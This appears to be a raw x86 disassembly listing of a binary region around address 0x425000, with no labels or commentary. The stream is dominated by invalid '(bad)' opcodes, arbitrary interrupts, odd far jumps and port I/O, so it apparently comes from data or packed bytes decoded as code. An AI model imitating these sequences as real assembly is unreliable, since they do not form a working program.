  4252ae:	push   ebx
  4252af:	adc    ecx,ebp
  4252b1:	xchg   esi,eax
  4252b2:	std    
  4252b3:	int    0xa6
  4252b5:	std    
  4252b6:	cmp    esi,ecx
  4252b8:	cmp    esp,ecx
  4252ba:	shl    ebx,cl
  4252bc:	xchg   edx,eax
  4252bd:	shl    ebp,cl
  4252bf:	sub    BYTE PTR [ebx-0x2b],dl
  4252c2:	push   es
  4252c3:	adc    ecx,ebp
  4252c5:	xchg   esi,eax
  4252c6:	stc    
  4252c7:	int    0x8d
  4252c9:	stc    
  4252ca:	aam    0x58
  4252cc:	cmp    esi,eax
  4252ce:	shl    edx,cl
  4252d0:	sub    BYTE PTR [ebx],bh
  4252d2:	icebp  
  4252d3:	shl    ebx,cl
  4252d5:	xchg   edx,eax
  4252d6:	push   ebx
  4252d7:	jecxz  0x4252a6
  4252d9:	(bad)  
  4252da:	std    
  4252db:	int    0xa6
  4252dd:	std    
  4252de:	cmp    edi,DWORD PTR [ebp+0x3b]
  4252e1:	loope  0x4252b6
  4252e3:	jmp    0x425277
  4252e5:	shl    ebp,cl
  4252e7:	sub    BYTE PTR [ebx+0xc],dl
  4252ea:	aad    0xf3
  4252ec:	int    0x8d
  4252ee:	in     eax,dx
  4252ef:	int    0xa6
  4252f1:	in     eax,dx
  4252f2:	cmp    edi,DWORD PTR [ebp+0x3b]
  4252f5:	loope  0x4252ca
  4252f7:	jmp    0x42528b
  4252f9:	shl    ebp,cl
  4252fb:	sub    BYTE PTR [ebx+0xc],dl
  4252fe:	cmp    esp,ebx
  425300:	in     al,dx
  425301:	sub    al,0x3b
  425303:	lock shl edx,cl
  425306:	sub    BYTE PTR [ebx],bh
  425308:	icebp  
  425309:	shl    ebx,cl
  42530b:	xchg   edx,eax
  42530c:	push   ebx
  42530d:	jecxz  0x4252dc
  42530f:	(bad)  
  425310:	std    
  425311:	int    0xa6
  425313:	std    
  425314:	cmp    edi,DWORD PTR [ebp+0x3b]
  425317:	loope  0x4252ec
  425319:	jmp    0x4252ad
  42531b:	shl    ebp,cl
  42531d:	sub    BYTE PTR [ebx+0xc],dl
  425320:	aad    0xf3
  425322:	or     dl,BYTE PTR [esi-0x2723207]
  425328:	int    0x96
  42532a:	std    
  42532b:	cmp    edi,DWORD PTR [ebp+0x3b]
  42532e:	(bad)  
  425330:	jmp    0x4252c4
  425332:	shr    edx,cl
  425334:	sub    BYTE PTR [ebx+0x13],dl
  425337:	xchg   DWORD PTR [edx],eax
  425339:	int    0x8d
  42533b:	cmc    
  42533c:	int    0x96
  42533e:	cmc    
  42533f:	cmp    ebx,ecx
  425341:	cmp    edi,DWORD PTR [ebp-0x2d]
  425344:	jmp    0x1353:0x92ebd328
  42534b:	int    0x96
  42534d:	std    
  42534e:	int    0xa6
  425350:	std    
  425351:	cmp    esi,ecx
  425353:	cmp    esp,ecx
  425355:	shl    ebp,cl
  425357:	sub    bl,dl
  425359:	repz xchg edx,eax
  42535b:	push   ebx
  42535c:	aad    0x33
  42535e:	adc    eax,DWORD PTR [ebx+0x2]
  425361:	das    
  425362:	pop    es
  425363:	pop    edx
  425364:	add    BYTE PTR [eax],al
  425366:	add    ch,cl
  425368:	jbe    0x425363
  42536a:	int    0x8d
  42536c:	mov    BYTE PTR [edx-0x327ef558],ch
  425372:	jbe    0x42536d
  425374:	arpl   bx,cx
  425376:	rol    BYTE PTR [eax+eax*4+0x3bedcd96],cl
  42537d:	ins    DWORD PTR es:[edi],dx
  42537e:	pop    esi
  42537f:	jbe    0x4253cd
  425381:	aam    0x3a
  425383:	pop    esi
  425384:	jbe    0x42530e
  425386:	fdiv   DWORD PTR [edx]
  425388:	retf   0x8814
  42538b:	or     DWORD PTR [esi-0x69a6d0d1],edx
  425391:	das    
  425392:	adc    dh,bl
  425394:	in     eax,dx
  425395:	add    BYTE PTR [eax+0x2f960980],0xf1
  42539c:	lea    ebp,[edi]
  42539e:	retf   0x2f96
  4253a1:	or     DWORD PTR [eax+ecx*4],edx
  4253a4:	ins    BYTE PTR es:[edi],dx
  4253a5:	inc    ebx
  4253a6:	jbe    0x425330
  4253a8:	sub    BYTE PTR [ecx+0x7188d600],0xbd
  4253af:	stc    
  4253b0:	std    
  4253b1:	add    BYTE PTR [eax],al
  4253b3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4253b4:	ror    BYTE PTR [eax-0x12326980],cl
  4253ba:	adc    ch,ch
  4253bc:	cmp    al,0x84
  4253be:	add    BYTE PTR [eax+0x49bf985b],0x21
  4253c5:	xchg   BYTE PTR ds:0xc911a60a,dh
  4253cb:	jbe    0x4253ca
  4253cd:	inc    ecx
  4253ce:	and    DWORD PTR [esi-0x128936cb],eax
  4253d4:	dec    ecx
  4253d5:	sub    DWORD PTR [esi-0x4a8936cb],eax
  4253db:	jno    0x425393
  4253dd:	cli    
  4253de:	arpl   bp,cx
  4253e0:	jbe    0x4253f3
  4253e2:	int    0x8d
  4253e4:	adc    DWORD PTR [edx+0x77cfffc0],ebx
  4253ea:	sub    DWORD PTR [edx-0xfc486c5],0xd392bdd3
  4253f4:	repnz sub BYTE PTR [ebx-0x2d],dl
  4253f8:	or     dh,BYTE PTR [esi-0x7]
  4253fb:	leave  
  4253fc:	jbe    0x4253a3
  4253fe:	into   
  4253ff:	and    DWORD PTR [esi-0x628936cb],eax
  425405:	inc    esi
  425406:	sbb    DWORD PTR [ebp-0x528936de],esi
  42540c:	mov    BYTE PTR [eax-0x34327f80],al
  425412:	int    0x76
  425414:	std    
  425415:	int    0x8d
  425417:	std    
  425418:	cmp    esi,eax
  42541a:	shl    edx,cl
  42541c:	sub    BYTE PTR [ebx],bh
  42541e:	jns    0x4253f3
  425420:	mov    ebp,0xcdd35392
  425425:	lea    edx,[ecx]
  425427:	int    0x96
  425429:	adc    DWORD PTR [ebx],edi
  42542b:	(bad)  
  42542d:	(bad)  
  42542f:	jmp    0x4253c3
  425431:	shr    edx,cl
  425433:	sub    BYTE PTR [ebx+0x13],dl
  425436:	das    
  425437:	rcl    ebx,1
  425439:	in     al,dx
  42543a:	outs   dx,BYTE PTR ds:[esi]
  42543b:	int    0x76
  42543d:	cmc    
  42543e:	int    0x8d
  425440:	cmc    
  425441:	sar    DWORD PTR [ebp-0x6d0d2cd8],cl
  425447:	push   ebx
  425448:	sar    DWORD PTR [ebx],cl
  42544a:	lds    ecx,FWORD PTR [edx]
  42544c:	jbe    0x425447
  42544e:	iret   
  42544f:	jbe    0x42544a
  425451:	jo     0x425410
  425453:	mov    ecx,0xa0000fe
  425458:	jbe    0x425453
  42545a:	int    0x76
  42545c:	stc    
  42545d:	int    0x8d
  42545f:	cmc    
  425460:	or     al,BYTE PTR ds:0xfc9dcf
  425466:	add    ch,cl
  425468:	jbe    0x425467
  42546a:	int    0x8d
  42546c:	std    
  42546d:	cmp    edi,DWORD PTR [ecx+0x3b]
  425470:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  425477:	push   ebx
  425478:	rol    DWORD PTR [edi+0x760af576],cl
  42547e:	cmc    
  42547f:	int    0x76
  425481:	in     eax,dx
  425482:	int    0x8d
  425484:	in     eax,dx
  425485:	cmp    esi,eax
  425487:	shl    edx,cl
  425489:	sub    BYTE PTR [ebx],bh
  42548b:	jns    0x425460
  42548d:	mov    ebp,0xcdd35392
  425492:	(bad)  
  425493:	std    
  425494:	int    0x96
  425496:	std    
  425497:	cmp    ecx,DWORD PTR [edi]
  425499:	cmp    ebx,ecx
  42549b:	shr    ebx,cl
  42549d:	xchg   edx,eax
  42549e:	shr    edx,cl
  4254a0:	sub    BYTE PTR [ebx+0x13],dl
  4254a3:	xor    edx,ebx
  4254a5:	int    0x8d
  4254a7:	cmc    
  4254a8:	inc    ebx
  4254a9:	jge    0x425483
  4254ab:	mov    bl,0xcd
  4254ad:	jbe    0x425464
  4254af:	int    0x8d
  4254b1:	mov    ch,0x3b
  4254b3:	jns    0x4254f0
  4254b5:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  4254bc:	push   ebx
  4254bd:	ror    DWORD PTR [edx],cl
  4254bf:	jbe    0x4254ba
  4254c1:	leave  
  4254c2:	jbe    0x4254b1
  4254c4:	bound  ebx,QWORD PTR [edi]
  4254c6:	xchg   BYTE PTR ds:0x1ebddcd,dh
  4254cc:	add    BYTE PTR [eax-0x5a723280],0xcd
  4254d3:	jbe    0x42547a
  4254d5:	cmp    ecx,ecx
  4254d7:	shr    DWORD PTR [ebp-0x2cf0c4d8],cl
  4254dd:	jmp    0x425471
  4254df:	push   ebx
  4254e0:	jge    0x4254af
  4254e2:	jbe    0x4254dd
  4254e4:	aad    0xbd
  4254e6:	or     dh,BYTE PTR [esi-0x63]
  4254e9:	int    0x76
  4254eb:	mov    dl,cl
  4254ed:	or     BYTE PTR [ecx],0x76
  4254f0:	in     al,dx
  4254f1:	retf   0xec76
  4254f4:	int    0x8d
  4254f6:	stc    
  4254f7:	das    
  4254f8:	pop    ecx
  4254f9:	ins    DWORD PTR es:[edi],dx
  4254fa:	cmp    edx,ebx
  4254fc:	or     dh,BYTE PTR [esi-0xb]
  4254ff:	int    0x76
  425501:	in     eax,dx
  425502:	int    0x8d
  425504:	in     eax,dx
  425505:	cmp    edi,DWORD PTR [ecx-0x2d]
  425508:	mov    ebp,0xd3f03b92
  42550d:	repnz sub BYTE PTR [ebx-0x2d],dl
  425511:	int    0x8d
  425513:	cmc    
  425514:	sub    edx,ebx
  425516:	int    0x5
  425518:	push   es
  425519:	popf   
  42551a:	cld    
  42551b:	add    BYTE PTR [eax],al
  42551d:	int    0x8d
  42551f:	popf   
  425520:	cmp    edx,ebx
  425522:	or     dh,BYTE PTR [esi-0x7]
  425525:	int    0x76
  425527:	std    
  425528:	int    0x8d
  42552a:	std    
  42552b:	cmp    edi,DWORD PTR [ecx+0x3b]
  42552e:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  425535:	push   ebx
  425536:	rol    DWORD PTR [ecx+0x76cd8876],cl
  42553c:	std    
  42553d:	int    0x8d
  42553f:	std    
  425540:	cmp    edi,DWORD PTR [ecx+0x3b]
  425543:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  42554a:	push   ebx
  42554b:	sar    DWORD PTR [esi],cl
  42554d:	jbe    0x4254fc
  42554f:	int    0x76
  425551:	adc    ebp,ecx
  425553:	lea    edx,[ecx]
  425555:	cmp    esi,eax
  425557:	cmp    edi,DWORD PTR [ecx-0x2d]
  42555a:	repnz sub bl,dl
  42555d:	mov    ebp,0xcdd35392
  425562:	lea    ebp,[ebp+0x62f7d43]
  425568:	imul   eax,DWORD PTR [eax],0x0
  42556b:	add    ch,cl
  42556d:	jbe    0x425524
  42556f:	int    0x8d
  425571:	mov    ch,0x3b
  425573:	jns    0x4255b0
  425575:	lock shl edx,cl
  425578:	sub    bl,dl
  42557a:	mov    ebp,0xd353aa92
  42557f:	int    0x8d
  425581:	stc    
  425582:	test   al,0x3b
  425584:	shl    DWORD PTR [ebx-0x35],cl
  425587:	rol    BYTE PTR [eax+eax*4+0x4edcd96],cl
  42558e:	in     eax,dx
  42558f:	xor    BYTE PTR [ebx],bh
  425591:	retf   
  425592:	pop    ebx
  425593:	call   0xbb05:0x2f888d5e
  42559a:	add    BYTE PTR [eax+0x2f024380],0x5
  4255a1:	rol    DWORD PTR [eax-0x44d07f80],1
  4255a7:	cwde   
  4255a8:	sub    al,0x5d
  4255aa:	lahf   
  4255ab:	xor    eax,0x8d0a8080
  4255b0:	std    
  4255b1:	or     cl,BYTE PTR [ebp+0xaf13b11]
  4255b7:	(bad)  
  4255b8:	stc    
  4255b9:	mov    eax,0xe3b813cd
  4255be:	retf   
  4255bf:	cmp    eax,DWORD PTR [eax]
  4255c1:	leave  
  4255c2:	jbe    0x4255b9
  4255c4:	adc    al,0x80
  4255c6:	add    BYTE PTR [eax+0x77fa43b8],0xc4
  4255cd:	mov    eax,0xb8fde6cd
  4255d2:	jecxz  0x42559d
  4255d4:	mov    eax,0xbb2ff93b
  4255d9:	(bad)  
  4255da:	stc    
  4255db:	iret   
  4255dc:	dec    esp
  4255dd:	into   
  4255de:	mov    eax,0xd692de5e
  4255e3:	pop    edx
  4255e4:	das    
  4255e5:	mov    ebx,0xf58d0a89
  4255ea:	mov    eax,0x4dd67d43
  4255ef:	das    
  4255f0:	mov    ebx,0xa6cdfd8d
  4255f5:	mov    BYTE PTR [ecx],al
  4255f7:	fs push ds
  4255f9:	adc    ah,0x3b
  4255fc:	das    
  4255fd:	mov    ebx,0xa6cdfd8d
  425602:	mov    BYTE PTR [eax+0x1e4c692f],bh
  425608:	mov    eax,0x3bb8d3e3
  42560d:	jge    0x4255c7
  42560f:	pop    esi
  425610:	(bad)  
  425611:	cmc    
  425612:	aam    0x23
  425614:	leave  
  425615:	jbe    0x42560c
  425617:	sbb    BYTE PTR [eax+0x76008080],al
  42561d:	stc    
  42561e:	int    0x7d
  425620:	mov    eax,0xb82c8e3b
  425625:	jecxz  0x4255f2
  425627:	mov    eax,0x82f98d5e
  42562c:	inc    ecx
  42562d:	in     al,dx
  42562e:	dec    edx
  42562f:	add    BYTE PTR [esi+0x11],dh
  425632:	leave  
  425633:	jbe    0x42562a
  425635:	push   ss
  425636:	add    BYTE PTR [eax-0x1944d080],0xfd
  42563d:	int    0xa6
  42563f:	mov    BYTE PTR [ebx],bh
  425641:	retf   
  425642:	pop    esp
  425643:	dec    esp
  425644:	sub    dl,ah
  425646:	push   ss
  425647:	add    BYTE PTR [esi-0x3],dh
  42564a:	add    al,0xe6
  42564c:	cmc    
  42564d:	sbb    BYTE PTR [edi],ch
  42564f:	push   es
  425650:	jb     0x425652
  425652:	add    BYTE PTR [eax],al
  425654:	cmp    ebp,DWORD PTR [ebp-0x56]
  425657:	arpl   bx,cx
  425659:	rol    BYTE PTR [eax+eax*4-0x47ee7233],cl
  425660:	jecxz  0x425635
  425662:	mov    eax,0x6d3b7d3b
  425667:	mov    eax,0x2f2c8e43
  42566c:	adc    eax,0x96b9ec6d
  425671:	int    0xed
  425673:	add    al,0xed
  425675:	mov    esp,0xc09a985b
  42567a:	inc    esp
  42567b:	add    dh,dl
  42567d:	mov    ch,cl
  42567f:	adc    DWORD PTR [ebp+0xf90b],edi
  425685:	iret   
  425686:	js     0x4256ba
  425688:	or     dh,BYTE PTR [esi+0x25]
  42568b:	iret   
  42568c:	js     0x425702
  42568e:	or     dh,BYTE PTR [esi+0x2d]
  425691:	iret   
  425692:	js     0x42564c
  425694:	or     dh,BYTE PTR [esi+0x35]
  425697:	iret   
  425698:	pop    es
  425699:	or     DWORD PTR [eax+0x760a8080],eax
  42569f:	cmp    eax,0x804107cf
  4256a4:	add    BYTE PTR [eax-0x30ba89f6],0x7
  4256ab:	or     eax,0xa808080
  4256b0:	jbe    0x425682
  4256b2:	iret   
  4256b3:	pop    es
  4256b4:	out    dx,eax
  4256b5:	add    BYTE PTR [eax+0x55760a80],0xcf
  4256bc:	pop    es
  4256bd:	xor    BYTE PTR [ecx+0x760a8080],al
  4256c3:	pop    ebp
  4256c4:	iret   
  4256c5:	pop    es
  4256c6:	inc    edx
  4256c7:	add    DWORD PTR [eax+0x65760a80],0xcf1dd60a
  4256d1:	pop    es
  4256d2:	xchg   esp,eax
  4256d3:	add    DWORD PTR [eax+0x6d760a80],0x813d07cd
  4256dd:	add    BYTE PTR [eax-0x25c4af33],0xa
  4256e4:	xchg   esi,eax
  4256e5:	icebp  
  4256e6:	or     dl,BYTE PTR [esi-0x6269f56b]
  4256ec:	or     dl,BYTE PTR [esi+0x7d76c9a5]
  4256f2:	(bad)  
  4256f3:	mov    cl,0xde
  4256f5:	adc    ebx,DWORD PTR [ebp-0x43]
  4256f8:	or     ah,BYTE PTR [ebx]
  4256fa:	and    eax,0xcd0d760a
  4256ff:	lea    edi,[ebp-0x33]
  425702:	out    0xd,al
  425704:	cmp    edi,ecx
  425706:	adc    al,BYTE PTR [edx]
  425708:	jnp    0x425741
  42570a:	ficom  WORD PTR [ebx]
  42570c:	das    
  42570d:	inc    ebp
  42570e:	cli    
  42570f:	xchg   edx,eax
  425710:	rcl    DWORD PTR [eax],cl
  425712:	xchg   edx,eax
  425713:	or     ah,dh
  425715:	mov    ch,0xcd
  425717:	out    0x7d,al
  425719:	int    0xa6
  42571b:	or     eax,0x3be1cd
  425720:	cmp    eax,DWORD PTR [ebx]
  425722:	shl    ebp,cl
  425724:	sub    BYTE PTR [ebx-0x10],dl
  425727:	int    0xe6
  425729:	mov    ch,0x61
  42572b:	add    BYTE PTR [eax-0x1dc49380],0x53
  425732:	cld    
  425733:	push   ebx
  425734:	lock or dl,dh
  425737:	stc    
  425738:	das    
  425739:	add    eax,0x808080f2
  42573e:	adc    dh,BYTE PTR [esi-0xf]
  425741:	(bad)  
  425742:	mov    esp,0xeb5f8bbd
  425747:	or     ah,BYTE PTR [ebx]
  425749:	and    eax,0x12958d31
  42574e:	jbe    0x4256ed
  425750:	(bad)  
  425751:	mov    esp,0x8d318790
  425756:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425757:	int    0x8d
  425759:	jge    0x425728
  42575b:	(bad)  
  42575c:	or     eax,0xcd7de6cd
  425761:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425762:	or     eax,0x212113b
  425767:	jnp    0x4257a0
  425769:	ficom  WORD PTR [ebx]
  42576b:	das    
  42576c:	inc    ebp
  42576d:	add    dl,BYTE PTR [edx-0x2cd7162d]
  425773:	out    dx,eax
  425774:	xchg   edx,eax
  425775:	cmp    ebx,ebp
  425777:	cmp    eax,DWORD PTR [ebx]
  425779:	push   ebx
  42577a:	or     al,0x53
  42577c:	clc    
  42577d:	add    al,0xd3
  42577f:	add    BYTE PTR [ecx+ebx*4],al
  425782:	add    BYTE PTR [edx],cl
  425784:	lea    edi,[ebp+0xa]
  425787:	(bad)  
  425788:	or     eax,0x53f18dcd
  42578d:	lea    edx,[ebp+0x761223d4]
  425793:	icebp  
  425794:	mov    edx,DWORD PTR [ebx]
  425796:	dec    edx
  425797:	stc    
  425798:	pop    edi
  425799:	sbb    al,bl
  42579b:	mov    ch,0x6b
  42579d:	xor    DWORD PTR [ebp-0x6289ed6b],ecx
  4257a3:	(bad)
  4257a6:	std    
  4257a7:	xor    DWORD PTR [ebp+0x121ceca5],ecx
  4257ad:	(bad)  
  4257ae:	icebp  
  4257af:	(bad)  
  4257b0:	mov    esp,0x76897abd
  4257b5:	xchg   ebp,eax
  4257b6:	adc    dh,BYTE PTR [esi-0x6f433963]
  4257bc:	add    al,0x12
  4257be:	mov    dh,0xa5
  4257c0:	jmp    0x4257cc
  4257c2:	and    esp,DWORD PTR ds:0xcd7d8dcd
  4257c8:	lea    ecx,ds:0xcd7de6cd
  4257ce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4257cf:	or     eax,0x92fc352f
  4257d4:	shr    ebx,cl
  4257d6:	sub    BYTE PTR [ebx],bh
  4257d8:	not    DWORD PTR [ebx-0xc]
  4257db:	shr    ecx,cl
  4257dd:	xchg   edx,eax
  4257de:	push   ebx
  4257df:	lock adc al,BYTE PTR [edx]
  4257e2:	(bad)  
  4257e3:	aaa    
  4257e4:	ficom  WORD PTR [ebx]
  4257e6:	or     cl,BYTE PTR [ebp+0xa113b7d]
  4257ec:	(bad)  
  4257ed:	or     eax,0xcd7d8dcd
  4257f2:	(bad)  
  4257f3:	or     eax,0xcd7de6cd
  4257f8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4257f9:	or     eax,0x212113b
  4257fe:	jnp    0x425837
  425800:	ficom  WORD PTR [ebx]
  425802:	das    
  425803:	inc    ebp
  425804:	add    dl,BYTE PTR [edx-0x2cd7162d]
  42580a:	out    dx,eax
  42580b:	xchg   edx,eax
  42580c:	cmp    ebx,ebp
  42580e:	cmp    eax,DWORD PTR [ebx]
  425810:	push   ebx
  425811:	or     al,0x53
  425813:	clc    
  425814:	push   ebx
  425815:	comiss xmm0,DWORD PTR [esi]
  425818:	xor    al,BYTE PTR [eax]
  42581a:	add    BYTE PTR [eax],al
  42581c:	int    0xd6
  42581e:	stc    
  42581f:	push   es
  425820:	imul   DWORD PTR [edi]
  425822:	add    eax,0x808080d1
  425827:	int    0x78
  425829:	fs int 0xe4
  42582c:	push   eax
  42582d:	fadd   QWORD PTR [edi+0x349acdff]
  425833:	int    0x6f
  425835:	and    al,0xcd
  425837:	jp     0x425865
  425839:	int    0xaa
  42583b:	sbb    al,0x87
  42583d:	cdq    
  42583e:	or     dl,BYTE PTR [esi+0x149acd0d]
  425844:	xchg   DWORD PTR [edi],ecx
  425846:	xchg   DWORD PTR [ecx+0xa],edi
  425849:	(bad)  
  42584a:	in     eax,dx
  42584b:	or     dh,BYTE PTR [esi-0x6b]
  42584e:	or     dl,BYTE PTR [esi+0x7bd543f5]
  425854:	xchg   DWORD PTR [edx],ecx
  425856:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425857:	cmc    
  425858:	cmp    ebx,edx
  42585a:	or     dl,BYTE PTR [esi-0xa69a15b]
  425860:	fcom   st(4)
  425862:	in     al,dx
  425863:	xchg   ebp,ecx
  425865:	jbe    0x4257fc
  425867:	int    0xa6
  425869:	or     eax,0x5b24bb2f
  42586e:	inc    ebx
  42586f:	call   0x14aa:0x436b771c
  425876:	ja     0x425820
  425878:	int    0x84
  42587a:	mov    al,0xcd
  42587c:	xchg   esi,eax
  42587d:	mov    ch,cl
  42587f:	and    al,0x1f
  425881:	or     dl,BYTE PTR [esi-0x30867803]
  425887:	xchg   esi,eax
  425888:	sbb    eax,0x9633a987
  42588d:	mov    BYTE PTR [edx],cl
  42588f:	jbe    0x4258a2
  425891:	or     dl,BYTE PTR [esi-0x4a89368b]
  425897:	push   ebx
  425898:	add    BYTE PTR [eax-0x2693280],0x4
  42589f:	pusha  
  4258a0:	adc    dh,0x28
  4258a3:	jo     0x425872
  4258a5:	jbe    0x42591c
  4258a7:	int    0x54
  4258a9:	xor    BYTE PTR [ebp+0xfddd],bh
  4258af:	int    0xd6
  4258b1:	stc    
  4258b2:	int    0x8d
  4258b4:	in     eax,dx
  4258b5:	push   es
  4258b6:	ins    DWORD PTR es:[edi],dx
  4258b7:	aam    0x85
  4258b9:	int    0x76
  4258bb:	std    
  4258bc:	or     bl,BYTE PTR [ecx*8+0x76041176]
  4258c3:	std    
  4258c4:	test   BYTE PTR [eax],al
  4258c6:	lea    esi,[ebp-0x69321c2a]
  4258cc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4258cd:	push   edx
  4258ce:	or     dl,BYTE PTR [esi-0xa69bc5b]
  4258d4:	or     dh,0xaa
  4258d7:	int    0x79
  4258d9:	test   al,0x63
  4258db:	retf   
  4258dc:	rol    BYTE PTR [eax+eax*4-0x6712326a],cl
  4258e3:	int    0xd6
  4258e5:	mov    BYTE PTR [eax],al
  4258e7:	pop    ecx
  4258e8:	adc    DWORD PTR [ecx+0x76cd8080],eax
  4258ee:	mov    BYTE PTR [ebp+0xfee4],bh
  4258f4:	int    0x7
  4258f6:	cmp    eax,0x3b808081
  4258fb:	retf   
  4258fc:	pop    esi
  4258fd:	mov    BYTE PTR [eax-0x322ce8d1],ch
  425903:	shl    DWORD PTR [esi-0x327f7b2e],cl
  425909:	fwait
  42590a:	sbb    eax,0x5b808081
  42590f:	cwde   
  425910:	int    0x11
  425912:	pop    ebp
  425913:	lahf   
  425914:	xor    eax,0x4eec8080
  425919:	cmp    edi,DWORD PTR [ebp-0x48]
  42591c:	jecxz  0x4258e9
  42591e:	mov    eax,0xd2044a0a
  425923:	xchg   edx,eax
  425924:	add    al,0x79
  425926:	xchg   edx,eax
  425927:	das    
  425928:	mov    ebx,0x7d43b84e
  42592d:	(bad)  
  42592e:	repz cmp ebp,DWORD PTR [ebp-0x58]
  425932:	mov    eax,0x8cd920a
  425937:	sbb    eax,0x63808081
  42593c:	lds    ebx,FWORD PTR [edx+0x7cdf9cd]
  425942:	sbb    eax,0xd3808081
  425947:	jmp    0xed0be0d2
  42594c:	dec    edx
  42594d:	add    DWORD PTR [edx],eax
  42594f:	add    DWORD PTR [ecx],0xffffffeb
  425952:	mov    esi,0x526c8809
  425957:	retf   0x14a
  42595a:	cli    
  42595b:	sbb    dh,dl
  42595d:	adc    BYTE PTR [ecx-0x80],bh
  425960:	or     ch,0x7
  425963:	sbb    eax,0x87808081
  425968:	leave  
  425969:	stos   BYTE PTR es:[edi],al
  42596a:	lds    edx,FWORD PTR [esi-0x12ed1233]
  425970:	mov    al,0x80
  425972:	add    BYTE PTR [eax+0xabd5f5b],0x23
  425979:	and    eax,0x76c99a98
  42597e:	cmc    
  42597f:	xchg   ecx,eax
  425980:	aaa    
  425981:	ficom  WORD PTR [ebx]
  425983:	or     cl,BYTE PTR [ebp-0x12893607]
  425989:	(bad)  
  42598a:	aaa    
  42598b:	ficom  WORD PTR [ebx]
  42598d:	or     cl,BYTE PTR [ebp-0x3692c4ef]
  425993:	jbe    0x425952
  425995:	dec    ecx
  425996:	and    DWORD PTR [esi-0x28936cb],eax
  42599c:	inc    ecx
  42599d:	and    DWORD PTR [esi-0xe8936cb],eax
  4259a3:	out    0x37,al
  4259a5:	ficom  WORD PTR [ebx]
  4259a7:	or     cl,BYTE PTR [ebp+0x5d76c995]
  4259ad:	fidiv  WORD PTR [edi]
  4259af:	ficom  WORD PTR [ebx]
  4259b1:	or     cl,BYTE PTR [ebp-0x1289329b]
  4259b7:	int    0x96
  4259b9:	adc    DWORD PTR [edi],ebp
  4259bb:	inc    ebp
  4259bc:	icebp  
  4259bd:	xchg   edx,eax
  4259be:	shl    ebx,cl
  4259c0:	xchg   edx,eax
  4259c1:	int    0x96
  4259c3:	in     eax,dx
  4259c4:	int    0xd6
  4259c6:	adc    ebx,edx
  4259c8:	jmp    0x4229:0xbea6c328
  4259cf:	cmp    ecx,ecx
  4259d1:	cmp    esi,edi
  4259d3:	push   ebx
  4259d4:	jns    0x4259e0
  4259d6:	jbe    0x42597d
  4259d8:	iret   
  4259d9:	jbe    0x425988
  4259db:	or     dh,BYTE PTR [esi+0xd]
  4259de:	int    0x76
  4259e0:	or     eax,0x8621d169
  4259e5:	xor    eax,0x37b680c9
  4259ea:	ficom  WORD PTR [ebx]
  4259ec:	or     bh,BYTE PTR [esp+eax*4-0x33]
  4259f0:	(bad)  
  4259f1:	std    
  4259f2:	int    0x96
  4259f4:	std    
  4259f5:	cmp    ecx,DWORD PTR [edi]
  4259f7:	shr    ebx,cl
  4259f9:	xchg   edx,eax
  4259fa:	sar    bh,0x9c
  4259fd:	cmp    esi,ecx
  4259ff:	shr    edx,cl
  425a01:	sub    BYTE PTR [ebx+0x13],dl
  425a04:	int    0x96
  425a06:	std    
  425a07:	int    0xa6
  425a09:	std    
  425a0a:	cmp    ebx,DWORD PTR [ecx+0x3b92f3d3]
  425a10:	popf   
  425a11:	shl    ebp,cl
  425a13:	sub    BYTE PTR [ebx-0x2b],dl
  425a16:	xchg   DWORD PTR [ebx],edx
  425a18:	int    0x96
  425a1a:	std    
  425a1b:	int    0xa6
  425a1d:	std    
  425a1e:	cmp    ebx,DWORD PTR [ecx+0x3b92f3d3]
  425a24:	popf   
  425a25:	shl    ebp,cl
  425a27:	sub    BYTE PTR [ebx-0x2b],dl
  425a2a:	xchg   DWORD PTR [ebx],edx
  425a2c:	int    0x96
  425a2e:	std    
  425a2f:	int    0xa6
  425a31:	std    
  425a32:	cmp    ebx,DWORD PTR [ecx+0x3b92f3d3]
  425a38:	popf   
  425a39:	shl    ebp,cl
  425a3b:	sub    BYTE PTR [ebx-0x2b],dl
  425a3e:	xchg   DWORD PTR [ebx],edx
  425a40:	or     cl,bh
  425a42:	nop
  425a43:	add    BYTE PTR [eax],al
  425a45:	add    ch,cl
  425a47:	lea    edi,[ebp+0x3bbd96cd]
  425a4d:	icebp  
  425a4e:	cmp    ecx,DWORD PTR [edi]
  425a50:	shr    edx,cl
  425a52:	sub    bl,dl
  425a54:	jmp    0x4259e8
  425a56:	push   ebx
  425a57:	adc    ecx,ebp
  425a59:	xchg   esi,eax
  425a5a:	mov    ebp,0x3bbda6cd
  425a5f:	cdq    
  425a60:	cmp    ebx,DWORD PTR [ebp-0x2c6d0c2d]
  425a66:	in     eax,0x28
  425a68:	push   ebx
  425a69:	aad    0xa
  425a6b:	int3   
  425a6c:	pop    ss
  425a6d:	aam    0x0
  425a6f:	add    BYTE PTR [eax],al
  425a71:	int    0x8d
  425a73:	dec    esp
  425a74:	int    0x89
  425a76:	int    0x96
  425a78:	std    
  425a79:	int    0xa6
  425a7b:	std    
  425a7c:	int    0x7e
  425a7e:	jo     0x425abb
  425a80:	popf   
  425a81:	cmp    ebx,DWORD PTR [ecx-0x2c6d0c2d]
  425a87:	in     eax,0x28
  425a89:	push   ebx
  425a8a:	aad    0xa
  425a8c:	int3   
  425a8d:	pop    ss
  425a8e:	aam    0x0
  425a90:	add    BYTE PTR [eax],al
  425a92:	int    0x8d
  425a94:	xor    ch,cl
  425a96:	xchg   esi,eax
  425a97:	xor    BYTE PTR [ebx],bh
  425a99:	icebp  
  425a9a:	cmp    ecx,DWORD PTR [edi]
  425a9c:	shr    edx,cl
  425a9e:	sub    bl,dl
  425aa0:	jmp    0x425a34
  425aa2:	push   ebx
  425aa3:	adc    ecx,ebp
  425aa5:	xchg   esi,eax
  425aa6:	std    
  425aa7:	int    0xa6
  425aa9:	std    
  425aaa:	cmp    ebx,DWORD PTR [ebp+0x3bfd76cd]
  425ab0:	cdq    
  425ab1:	shl    ebx,cl
  425ab3:	xchg   edx,eax
  425ab4:	shl    ebp,cl
  425ab6:	sub    BYTE PTR [ebx-0x2b],dl
  425ab9:	int    0xa6
